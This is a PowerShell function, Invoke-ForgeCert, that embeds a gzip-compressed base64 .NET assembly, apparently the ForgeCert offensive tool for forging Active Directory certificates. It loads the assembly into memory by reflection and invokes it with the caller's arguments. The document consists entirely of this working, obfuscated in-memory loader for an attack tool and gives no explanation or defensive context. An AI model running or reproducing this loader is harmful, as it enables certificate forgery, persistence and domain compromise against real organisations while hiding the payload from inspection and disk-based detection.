function Invoke-ForgeCert ($Params){
    if (!$ForgeCert_assembly){
        $compressed = "H4sIACP/sWUC/+1aeXAcV5n/umemezQjTaTxfdKWY1s+NJZs2bGN7VjWEQ+xJVmHYydO7NZMS+poZnrc3SNbCRhpw7EGG+KFsJUUZG1zFE5xLOHYhJAL2AAFKTZQkE04ytmF5SiWLEWWItlA9ve97jl0eAlbtX8tLfX3vut973vfe+97r7vnwM13U4CIgrhfe43oIfKuPfSnrwncsTd8MUafq3p6xUPS/qdX9I+Yjpa3rWFbz2opPZezXG3Q0OxCTjNzWnt3n5a10kaipiZyrW+jp4NovxSgzz174ANFu1eonqJSE1EDiLDH+3EngIb7uO8d47LnN19KsfIFj89XgI6/nahW/JfLUiGud8FuN3l2PxGavZPVKH4PP7fRn3FpJdfFFQa9r4JOuMYpF+VPVvv9aij7XWHieMJ27BT5vh33O7puqh6isSdhGxkr5fkqBoZtNc3Q2zvdzcc6vXKfqBKij6/CmGgcO5niFWF9vddy+U4Jo7KuXg68RSBgyEWG7DMCRUbAZwSLjKDPCBUZIZ+hFBmKz1CLDNVnhIuMsMdoqCOKrLujAb2IyBZ8WT/3j8ocdMmZC04DfFm/eh3NaVLpEfgNeZ3QUmQLXikNCwEiNhh5xVrCDNRSNB7ThvnAoh7Xmi+sh0Q9eKIoqrVAsGoE6xquCYZSbW+HqbCwIltVAkYBw6q1kN2ZB3zJuQ1wZNV8+06oXlq1wNO7tGqh/RXBWORVubRqsf3vzGhYxDUXczfRjwB9yRv2ugC7FnGWAkRkIbd/I/qxjPWXFyspC+dbb0AZVRsw4JHGWnuBRHm1rGDvkrjWiim17JRg1gM9CyA1rCxJ3isk184ieURIVk019IJgrp7CXMfjcatYu1TnrOEeBEWMrQb2NOisRVGtqGFrHfdADTnrUS44t1gELnzJ2sA9bwSoUaoCVgLIaQQxaG3kQamymrihZhExEjFb7uW+OqElO5u4RWcz4CrFauF2t3jKc5oU4umBka4LcSCVArSkDQtPby1657Gd69jE+vmnt83Gd7aLgMvWDpRqwHkjK+0EiCmNq9XTu9jf3QAaL2Hr+qL7DXtYrxVgfViNKQJTG7CYI3NC8dCChjYWt5eYVgejsaDVydG4gXtjqzLlnX0sTDK9YH7QeRNLbyyyqufPDzv7i6war1qVEM0JqqcPoJxfFxQaVhfbP93NrJC3Dno4sAe5dm9RIRby5tV1C861iuFZGgs5fazSz2AAYO5c5xCKS85N3Iqinj4sWlG8BhTriAj+EozTx7zUVycvWuDcDK43ts4tHFTFOsqToDlqb+FOYvpE7lCs29iPYxzu9e2qdVzMm7AYEEsX88MnBkUHHawEZVVdkHNoxFrORJWVZhzLSJkT+vFa1TK4N5/78Vy1gEkrzVHqlA0qfB0C+4f2eKnpuhDmi1TLa7GFet5Gc7286OWjhDOMYqLKT1qRYtKK+IxokRGtzGJI3H1v2itxliIvx4+1JJoSm5s2N29nTogygD+H1ZWnifphbA/yz8o+1zZzww5rvB9J6Akkh5UDfdS/2NsDV94wkMSkoTToX2Fir9yb4WiIC6rSTcsuVVXBFr0ibab5IkfSm/yzAtwjhIwQHRr2t5sWf3tinKvN9fKquIN+6W1xr4Ukf9c2Q7dUKfR9Ac8Ffx++hu7kpEefD5Kq0P4Qw2UCPirgGQEvCfgtoXMxuBN13yogCf7PgjWKQu+MPg+YDt6CLjyl7lZitDP0QCBCLyjzaiL0amAcPo6ET6hx2kWPQScAPEI/D6wG/nT1alj7R+WH0HkywvxlgduA/1014x8Pc92fhNcAOtE18PZDgeeVCP0oehvw94SbIxH6nbDwX/LzaPdV9YFAjBbSAwEFMQhLCl1DzF8cYc51Cvs5L8Dw1cBjVXF6AlChb6J1hWoD7MNXwv8Bm89F7gd0I+8F5xmVW39X9ZxohP46EoXPI5F3Ab4gM3+NwvB0lOFDghONsP+fqWbPj6qM/1TAb0YZ7hK9+2gVw9MCf6WK+/JF4cNXZYZbogzjKvv5otzMA0wfF6Pozctaao9UVbeWqO8oTFXhFCGDegc2zlbYXQLp76SELJEu4EaZ4YTAvy/gLgEfFbBObpSa6WdKM/AL0hbAffJ2mc8nBIt/o5yFtcM+dUGpBaX71Lvls2jX9KkPybWgbJ96T/Qs9pc7fOq+aC2ou3wqGTiLufpunzoaqAX1fp/KoL0QfdCn3or2QvRRn7oV7Sn0SZ9y0Z5CX/CpftRT6TGfOo56Kn3Np86pu+Qwfdun7lf3SmH6Z49a+GxYQfyuCOo8/VrZK2NprPCoQPU+OUJf96l9apccpbvrPUoNDMg19KpPdYSPyXXEmzFTG4KGHKePXOtR/dUFeRGNrCq3t4Tygjq/8EfhN8tL6M2eLFwdDIF6m08tDT4MzXM+1V49ijxwj0/tr34K1P0VNpeJOfJS6M+DWFCANwn4uMqZY0414+8PMP5pmc8IzAnSKcH/rMJwd5ilH4uylA9yQZoIc1p4hWprFfoMoEoPqqz5KaVop9xuFT0bxqwj9noRYITWAtZSs4DbBWwVMCngQQGPCKgDziNT4CcEHBfwjLB2r8AnBb5d+mx0MeCeqIZc/mx4Nx2RNkntdJmepCH4+CKNAh4OjmKNGNE8mdIXAmOQrpEm6WHov4NOSDyHWXo3ODvVDwDfWHM/+JvDZ8F5OvBhcDLRy8AXhz8M+Mso88+pZ+kbwodJ2oJZ+Qzwh8H5l+rHaa30bPgp4FU136LnhI4ubat+FpxXQj8Ep6l6ks5Iv6r6Gb0A6W/pvMQ656VPRV8BPBwm6aLURUukz4CvSQ9L16pLpJeFnZfp8/D9FyICL9O3gZ+njwUaAc+oDDdUN0tPSk/L10H/01gBddKK6n2AxyJd4KwJDwD+IMBwFHNLEu1eltiaJK2UjkrPCPw5wJT0AmBG+oW0OsCt/1ZxgP8Unlym2zBLfyMdUk9LkowYSnWA56RFgO+TVgDeJ1UBXpQWwcKnUKs7yha6g1+QmsH/J4nj9gPAl6M/kZIyt/gNerDq59JB+b7wr6UV0uPRlyDdE/w94F3Vf5TWSrwuniFeOSukhdURuVl6Cfn+oohJTJxy45g1a2WN7iQ7sELAtXQXnQwksL++T07QHPog4BJ6BHAl8nCC1tN3ATcL+EYB2wT/RnoOsE9wbhEwRb8BHKUlsOZQQ2CPsN8qYBKtfDVwXOC6gCY4c4ITAp8U8Aw4twcvCPyigJfBeSj4hMCfFBA9perQFYG/IOAvwOkNkcS4JGCVdBddCGkC3yNgq4DHBdQFnBDwgoBPCHhFQJKFZkDoCHhBwCcEvBUtfpp+TSHpUUnG+g0iWxJ9RJnAmr4oM7w/yvB4gOFdgn9K8NMCf1B9G2Bb8AzgO6rfI7ONAG5ZPP0GkDXYZkg8F6uckQBl3FW8iwPKuKPAsbsCj1IN8GpAGfc1wGOAMu464LWAMkZyDvClgDKy4jzgywG3EgLvn+2KV1V1+d0GXzH53/y9Nix6ydcCuaB6Z7XymwZNfoBf50yr+7zi8QK0BrlsPW5xJTtyhaxh64MZ43gztaZc08oB6dFtx7B7DaeQcUF228OJvVYhlxpv0x03YyRanVwzHd7StL3NsF1zyEzprrGJOtraHf0m0x3pG9E3bdk6e7UEV5spmp3rVdhOOw9Y6ULG2E1tvfupz3CTjlMw7PYuGjbcY32FwduNlAsKkgpi3HGNbCLZTVknZdkZc1Bo9xQGM2aKHE/Pp3zdNiuTMUQMnMQNRs6wIWpNp+kGw+3Ipay0kSbunohOmnZ2F9x8weUQ9OiOc9Ky07tHjx3bq6dGcebuNI0MdNr0G43xq4t9d1szbpeeNWapXo7vLMLe/T26OzJTUOnYbHLfqdlEfei0nukqZAcN+6ruzhTA3gwmR3tmiMiZnc3aU4IlFKdy8kWk3bD7jBMFI5cyqNPMGJgeBrXZBsLUq+fSVjaZQzlsEE8gMXQ8wytnOyXbTSdvOQLv08eMfqtn6BTbojYMv4WSpySPCpUHybBzumuOGYItZghixXjFPPTHUrg/nTWVhAd4PBss8ITrscycxx2CDzkhRm/6TSDdOXYqm0XP9pvAb7JN1xBY0cX+8bznQ5fl7jWGLNvgtVAmekZTTvOmPpdxr9/G9OXrDUAF7Uyjve66xlSeO5uKt9Bsc4xxeJ5Hl+yiMN3qer2GfsGsoNqNwcLwMA9ImYfKh0zHnMJrdRwjO5gZ7zfdWdm2njayuj1aFvXrNjzqtBEpTJ/RmXV43A8ZtoOBmCnEfBgyhwvwfYq4O+/Oqt5uOCnbnCb0giAs9BoZ/ZTAnJmVe2wkOsyQWZzIj9vm8Misomxez42XBb2FnIt5I/iuOWhmTLdCOqZnCt6Up04LceEBTBinjGIS9Gsn/HhgOfNyG3CHtnkvE6jf8pEZ6foAUoo3j7zM5M0hH5+eDnzxNFZFGijWL1F5Blgcwyh4xOCGoWfpgJG17HGf6PE+PfidwSpIFWw/J9AB3cxxPu845Ro57lupy8aQn/ep1R5Gisi5HadShhhD8jYzzvu9jo5cYo97fMx9XnrJ3JCFVrF6uQ+C8hJRX+UOgy4I0YyQtbE5i/pPWl4OqUi/XgapZPD+VkmPGJjqNu01h5M51xgGipHqFs0m0+gE1iV4rQV3xELKGGcnymxvj8csGs9mDQxoSoSZ1wjSXDGZtA65XrslnAXe9kumVxQXNsIjTJhlVpEuN9Jm5kcMu8j3LBSpYnpGmvK23BLFuerQ5opU4zcAUbnVMi+R8qAopmwBhwzB88e93dSHc5bjminnKmcPTpwzRYI7bbnwCNhWHuMzZqaMGeJiFizJvWyHZcR71yxtDLi8bk2IKvYZR4S/NWPqTrkJMccxvP5cwvTPj4wnpqV3x9s1WjOZveNM9Rq6Y+U6M/qwQ8iOjghxaWE4U06AFeyZB6XKnclLiQ5Zfom1dsSAoYoZioa2T5+hjtifZnKvslgSpVnqEIbeH3beQ8v8jjZ/+6mc1Fe3WJo6V1fpzhc1OPW0pjCGfpSKKQOhsDMz9nQOUA4jwMk2i4KnlddVXqz9+vCwkfbpikNE5emheGygZM70lNqNIR3j4iXLgm2j8ZmHiaI3HsGq/SNIG3m7SLahly71ubrtlncCSjE4YOGMw58nWW/ATXVZJ6kHd7/Vatv6OMq2Ed32cFZBlIXHXGJmpUXO5jVcyn6cQ8pEvjQ4rMQFh6XPHMbxCvm6U+dVOk7JGZzZkmpRNm3Gd+RcWzQ7gzcl5ZXUSviMGVBcYJR0ugqZTLfdkc2D4uu6NmolDU/gBtnkkklDuFN4pnfB0ShJOXAsyLKCZwLP0Q6i1gh1Cv4w9NL/Gws3RKhd4AYloNcH6Zhva2iK5dRVLLvQ0ojWanQSfJdGBG9EyPLQcvB3UlhiK2tICuBepYm2CjRIt0MzhRo7SJv2R7NotVIGsAt2s+DsKGklRTsF4eNMS9Ba79lyUZN7oaHXXg8qte+kJnqLr9uBmKSvolehK1rvR38L8GgQPcZuhJpT+1PsiSGkOvowq4+NzcRvZBJ4jk8Q4y1+uRmQy01okyFzqM2bM44YAVvEOyVGkvvIPjjgZEsyHhMdXA2WNBoFD1OvY6aNNDBD1M0Bc2dY1YSV8ZIN/ijUVHjpqe90XUl+8sjXn3zgvtEBCmqSFA5oJIWA1NUxGWMgh4jiEx+qbZKkefGJi9JyQvFRyCJSPKwCv4wypMnS0oULayW5rOMXl1GE1UC8Nn4kPhDUKF5goIdIii2LBQmthFQ5fivaomUhbntZCF7EQiTHYjFVk2N1E4/K0JNjIY3qJs4IwdIqNRg3YnEznuUq8QEFDoAUhB7RAiAm7lkWN9lqgOn4xJPLAvGDCkFvWSioSvETXCd+MCzqnGCnjsxT1fh4/C3xicn4xNsB0Vx84lxQiU98z2tAF8qFgBJPAosnwxEKxJPi76AQJfkb8cQZRZMAwwqHUlBo/6dhuCGHgXj0pOfW92RwVAL2h7juSf7A4QzHBDFZ5RU11aw9WRefnAdC5TjFJ0OQxQfgMvw24hPnlyIgE/cg1BP3ihjUTS6rm1wR5n5y9xFX9Jbik2sZTpwHvZS7YXJTqMhjEB8AVw7/wx1HDy1quXImHLv3utv6x+7dG775ncHJfz383XHxcklWYojBQdwDuHWuh57DpxjDeFiEOT5QRUEphlIMd/xI+BpSQRTAqo3rsXgSavHaWCxASDENFAs2wAyDAQZ6WPLfbS3nz0r98vybcL7psnKlA3r/iG2ddKSw5H9ZjElUVd7OyPvOuECieOkRSvvyZU3b1LSpGdlPomsH05tbtm7dtr1xm2FsbWxpGtzcuG3LtsHGFiO9vWWoaVu6pUknqpZIbU408R9RUqLFia6O/tIj5Qb/aWnXWEtiC9yMzS2J+Hk7o4/z8S3OdbSSRINukN3bL1GkTS8+A8noZbjXOFEwbSMt9cfC+4xMvh+78aq2Vs3fObVRY1zTHU3XEvmhU5plo2zepPG7gy6JYkVj3uuSKQapwuDKoobmWpo7YmjTGmBzh9Bvf9cNXM3OG3wFjd9b8O+82FaqvO32H1T9I0tMbevaNYCT5QF4OfXtyFW7XT/Q06VZQ8JoAVXZWR3PNHxQZOuIQ59E0S7j5J+M4HqWaifxBGKwFQcPwcJszjjpBbLC6Q6JrinZnCWQlXYXTQ+kMMbhQz8DeAK+6hA0ZtJ6XuMnW9EtDbraEIaTjQzxLE5X+nSjRIr3BHhVgw2OkGs58Yj4P9jiZfHlI7c/7H/rp5t5P+jE3TD191y1037f1dvX3ve3t760p+bQ1zruubJi4D//akmUJ3HbjqODBTOTdo6m8ERQwFl1/GhpHVZg1uDtR3uNDJ4/jDI3kU8P0oOd5Va+Vfy13yzXY52VFM6xdscpQzzcize9hpFIZzK+9LVVpO2hv1yv95LFeCPwEwv5t5neLwkrLu/b/rZZ+MWfHc6mP3IV/U8g6d99nGhpoCxZGuBfkRzCqesYYAf1AktSN86Ox1B24dwsfq1JjwZf/GP51yVlm9f7VJCmf1Ehahe8Q+Is2YlTUQYnoeIJm69rRa1+SHVxDstUnLm96++Dbxbfi/lE6p0Yh2exdFjoNJX+WnDC5J9iLhbxaINOVpyD+XTm+JbrK2R5/6xWPC8Xr50UgU6xvXZx3ksJP/JT/Cw/WxSfK/inoOGKuocE36mow+fUptLNbcWgnxQ+sm5OnH/LHs1sI4HylJDtozjq7gc+LGpxr/LoD3s6jNnA/szkaXRZnKf5tLxJfKFaJ2JStuONTBp0VozhaCl6PLbsb7dvz/T9LfY397r8bhHx7QHXQisF8eRSOQazxbVFxHVqnenRnR7bbaJOq3j2McTzR0aczP9UvS+liH5ZMalffOTxndefyma0Mf/4UY8jSr1m8OsuMze8q36gv7NxW73muHourWesnLGrftxw6q/fXROpiezU/TfIGkzknF31BTu3w0mNGFndacyaKdtyrCG3Eel8h+5kE2PN9VpWz5lDhuMeqmwPxjStZMx7g+OOT/GJ/+rF8WBX/YHx1nw+w3sQpAk9n6/f6Flw7YIj3qC+Tn82eS2jpuM/ofs0ODZ/HnJcI83vgbAPDxvO67S6ub5kpdIOtpiUeLmy3xgzMlqG4a563UnmxqxRw67XCqb3UmhX/ZCecQy/U8LIxlm8Kbq+cYrvOzeWggB658ZiUHf/H6b8Pd7vCa9s/cvu9//x+m8rfRAaADIAAA=="
        $bytes = [System.Convert]::FromBase64String($compressed)
        $input = New-Object System.IO.MemoryStream( , $bytes)
        $output = New-Object System.IO.MemoryStream
        $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
	    $gzipStream.CopyTo($output)
        $gzipStream.Close()
	    $input.Close()
	    [byte[]] $decompressed_bytes = $output.ToArray()
        $Script:ForgeCert_assembly = [System.Reflection.Assembly]::Load($decompressed_bytes)
        "Loaded!"
    }
    $ForgeCert_assembly.EntryPoint.Invoke($null, (, $Params.split()))
}
